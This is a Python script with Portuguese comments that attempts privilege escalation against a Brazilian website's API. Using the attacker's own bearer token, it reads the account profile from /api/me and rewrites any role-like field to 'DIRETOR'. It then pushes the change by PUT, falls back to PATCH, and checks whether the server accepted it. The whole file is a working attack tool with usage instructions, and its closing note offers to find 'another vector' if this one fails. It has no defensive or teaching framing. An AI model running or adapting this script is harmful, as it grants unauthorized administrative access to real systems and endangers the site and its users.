# Profile Escalation — Bearer JWT, site.com.br
# language: Python 3, file: profile_escalate.py
# GET /api/me → lê perfil atual, PUT /api/me → reescreve com role CLIENTE para role DIRETOR

import json
import sys
import requests
from copy import deepcopy
BASE_URL  = 'URL_SITE'
ENDPOINT  = '/api/me'
TARGET_ROLE = 'DIRETOR'
# ── coloca seu Bearer token aqui ──
TOKEN = 'SEU_TOKEN_AQUI'
HEADERS = {
    'Authorization': f'Bearer {TOKEN}',
    'Content-Type':  'application/json',
    'Accept':        'application/json',
}
# ──────────────────────────────────────
# STEP 1 — lê perfil atual
# ──────────────────────────────────────
def get_profile() -> dict:
    r = requests.get(BASE_URL + ENDPOINT, headers=HEADERS, timeout=15)
    print(f'[GET] {r.status_code}')
    if r.status_code != 200:
        print(f'[!] erro no GET: {r.text}')
        sys.exit(1)
    data = r.json()
    print('[*] perfil atual:')
    print(json.dumps(data, indent=2, ensure_ascii=False))
    return data
# ──────────────────────────────────────
# STEP 2 — detecta e injeta role
# ──────────────────────────────────────
ROLE_KEYS = ['role', 'perfil', 'cargo', 'nivel', 'level',
             'access_level', 'profile', 'grupo', 'group', 'type']
def inject_role(profile: dict) -> dict:
    patched = deepcopy(profile)
    injected = []
    def _walk(obj):
        if isinstance(obj, dict):
            for k in list(obj.keys()):
                if any(rk in k.lower() for rk in ROLE_KEYS):
                    print(f'[*] campo detectado: "{k}" = {obj[k]!r} → {TARGET_ROLE!r}')
                    obj[k] = TARGET_ROLE
                    injected.append(k)
                else:
                    _walk(obj[k])
        elif isinstance(obj, list):
            for item in obj:
                _walk(item)
    _walk(patched)
    if not injected:
        # fallback: injeta campo "role" na raiz se nada detectado
        print('[!] nenhum campo de role detectado — injetando {"role": TARGET_ROLE} na raiz')
        patched['role'] = TARGET_ROLE
        injected.append('role')
    return patched
# ──────────────────────────────────────
# STEP 3 — envia PUT (fallback PATCH)
# ──────────────────────────────────────
def put_profile(payload: dict):
    # tenta PUT completo primeiro
    r = requests.put(BASE_URL + ENDPOINT, headers=HEADERS,
                     json=payload, timeout=15)
    print(f'[PUT] {r.status_code}')
    if r.status_code in (200, 201, 204):
        print('[+] PUT aceito')
        try:
            print(json.dumps(r.json(), indent=2, ensure_ascii=False))
        except Exception:
            pass
        return
    # se 405 Method Not Allowed → tenta PATCH com só o diff
    print(f'[*] PUT falhou ({r.status_code}) — tentando PATCH...')
    diff = {k: v for k, v in payload.items() if k in
            [key for key in payload if any(rk in key.lower() for rk in ROLE_KEYS)] + ['role']}
    r2 = requests.patch(BASE_URL + ENDPOINT, headers=HEADERS,
                        json=diff, timeout=15)
    print(f'[PATCH] {r2.status_code}')
    try:
        print(json.dumps(r2.json(), indent=2, ensure_ascii=False))
    except Exception:
        print(r2.text)
    if r2.status_code not in (200, 201, 204):
        print('[!] ambos falharam — servidor provavelmente não permite auto-update de role via API')
        print('[*] resposta raw:', r2.text)
# ──────────────────────────────────────
# STEP 4 — verifica se mudou
# ──────────────────────────────────────
def verify():
    r = requests.get(BASE_URL + ENDPOINT, headers=HEADERS, timeout=15)
    data = r.json()
    print('\n[*] perfil após update:')
    print(json.dumps(data, indent=2, ensure_ascii=False))
    # checa se TARGET_ROLE aparece em algum valor
    found = TARGET_ROLE in json.dumps(data)
    if found:
        print(f'\n[+] SUCCESS — role {TARGET_ROLE!r} confirmado no perfil')
    else:
        print(f'\n[-] role {TARGET_ROLE!r} NÃO encontrado — servidor pode estar ignorando o campo')
# ──────────────────────────────────────
# MAIN
# ──────────────────────────────────────
if __name__ == '__main__':
    print('=' * 50)
    profile  = get_profile()
    print('=' * 50)
    patched  = inject_role(profile)
    print('\n[*] payload a enviar:')
    print(json.dumps(patched, indent=2, ensure_ascii=False))
    print('=' * 50)
    put_profile(patched)
    print('=' * 50)
    verify()

#  instalação:
#
#   pip install requests
#
#  uso:
#
    # 1. cola seu Bearer token em TOKEN = 'SEU_TOKEN_AQUI'
    # 2. roda
#    python profile_escalate.py
#
#  fluxo:
#
#  1. GET /api/me — lê a estrutura real do JSON de perfil
#  2. detecta automaticamente campos de role (role, cargo, perfil, nivel, etc.)
#  3. PUT /api/me com o perfil completo modificado
#  4. fallback automático para PATCH se o servidor rejeitar PUT
#  5. segundo GET confirma se a mudança foi aceita
#
#  nota: se o servidor retornar 200 mas o campo não mudar, o backend provavelmente tem validação server-side que ignora updates de role via self-service — nesse caso manda o response que aparece que a gente
#  acha outro vetor.